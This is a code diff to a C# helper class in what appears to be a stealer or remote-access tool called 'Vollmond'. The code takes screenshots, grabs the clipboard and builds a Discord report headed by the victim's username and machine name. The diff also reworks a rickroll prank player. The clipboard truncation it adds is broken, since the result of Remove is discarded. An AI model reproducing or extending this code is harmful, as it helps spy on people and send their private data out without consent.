@@ -4,26 +4,28 @@ using System.Runtime.InteropServices;
 using System.Text.Encodings.Web;
 using System.Text.Json;
 using System.Text.Unicode;
+using static System.Net.Mime.MediaTypeNames;
 
 namespace Vollmond
 {
     public class Auxiliary
     {
-        public static string discord_payload = "";
 
-        public static Thread play_rick = new Thread(() => // Playing rickrol sound
+
+        public static async Task PlaysoundAsync(string url_sound)
         {
-            using (var mf = new MediaFoundationReader(URLs.rickroll_sound_url))
+            using (var mf = new MediaFoundationReader(url_sound))
             using (var wo = new WasapiOut())
             {
+                var tcs = new TaskCompletionSource<bool>();
+                wo.PlaybackStopped += (s, e) => tcs.TrySetResult(true);
+
                 wo.Init(mf);
                 wo.Play();
-                while (wo.PlaybackState == PlaybackState.Playing)
-                {
-                    Thread.Sleep(1000);
-                }
-            } // Copy-paste from NAudio docs 
-        });
+
+                await tcs.Task.ConfigureAwait(false);
+            }
+        }
 
         public static string MakeScreenshot() // Return path to the screenshot
         {
@@ -93,6 +95,11 @@ namespace Vollmond
             GetClip.SetApartmentState(ApartmentState.STA);
             GetClip.Start();
             GetClip.Join();
+
+            if (clipboard_text.Length > 700)
+            {
+                clipboard_text.Remove(700); // Discord message, have an limit for 2000 simbols
+            }
 
             string discord_payload = $"""
             ## New user: **{Environment.UserName}\{Environment.MachineName}**
